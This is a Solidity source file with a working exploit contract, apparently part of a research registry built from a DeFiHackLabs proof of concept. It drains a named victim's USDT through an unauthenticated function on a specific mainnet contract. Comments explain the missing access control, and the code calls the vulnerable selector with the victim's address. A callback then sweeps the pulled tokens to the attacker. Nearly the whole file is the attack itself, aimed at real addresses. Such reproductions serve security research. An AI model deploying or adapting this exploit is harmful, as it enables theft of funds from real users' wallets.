// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-Contract_0x7657).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`ContractTest`) itself: `attacker = address(this)`, and the callback the
// vulnerable contract invokes during the drain (`Sell(uint256,uint256)`) lives
// directly on the test contract. There is no standalone exploit contract to
// deploy, so this is a faithful, self-contained copy of that inline attack
// (run() + the Sell callback), compiled inside the registry forge project.
// Logic and constants are copied verbatim from test/Contract_0x7657_exp.sol.
//
// Root cause: the unverified vulnerable contract 0x76577603...744CB77 exposes
// a PUBLIC function at selector 0x0a8fe064 with NO access control. It:
//   1. USDT.transferFrom(from, self, amount) - spends a THIRD PARTY's (the
//      victim's) standing allowance, where `from` is an attacker-chosen arg.
//   2. USDT.approve(msg.sender, amount) - approves the CALLER for the pulled
//      funds.
//   3. Calls back into msg.sender.Sell(amount, 1), during which the caller
//      does USDT.transferFrom(vulnerable contract -> caller, amount),
//      sweeping the funds out.
//   4. Writes msg.sender into storage slot 6 ("owner") as a side effect -
//      this is set, never checked, so it gates nothing.
// Because the value-moving calls run before (and without) any ownership
// check, and because `from` is caller-supplied, anyone who notices a victim
// has approved this contract can drain that victim's USDT for free.
// No source is available for the vulnerable contract (never verified on
// Etherscan); the vulnerability locator therefore anchors on this exploit
// contract instead.

interface IUSDTinterface {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

contract Contract0x7657Drain {
    IUSDTinterface constant USDT = IUSDTinterface(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address constant Contract_addr = 0x76577603F99EAe8320F70B410a350a83D744CB77;
    address constant Victim = 0x637b935CbA030Aeb876eae07Aa7FF637166de4D6;

    // step 0: read the victim's current USDT balance (this is the `amount`
    // the drain will pull - the victim's near-unlimited standing allowance
    // lets us take the whole balance), then trigger the vulnerable contract's
    // unauthenticated selector 0x0a8fe064 with recipient=self, from=Victim.
    function run() public {
        uint256 victimBalance = USDT.balanceOf(address(Victim));
        (bool success,) = Contract_addr.call(
            abi.encodeWithSelector(bytes4(0x0a8fe064), address(this), Victim, 0, victimBalance, 1)
        );
        require(success, "drain call failed");
    }

    // The vulnerable contract calls back into US here mid-drain, after it has
    // already pulled the victim's USDT into itself and approved us for the
    // full amount. `_snipeID` is reused as the amount to sweep - we simply
    // pull everything the vulnerable contract just approved us for. Uses a
    // raw low-level call (not the typed interface) exactly like the original
    // test - real (old-style) USDT does not return a bool from transferFrom,
    // so a typed call here would revert on ABI-decoding a missing return value.
    function Sell(uint256 _snipeID, uint256 _sellPercentage) external payable returns (bool) {
        address(USDT).call(abi.encodeWithSelector(bytes4(0x23b872dd), Contract_addr, address(this), _snipeID));
        return false;
    }

    receive() external payable {}
    fallback() external payable {}
}
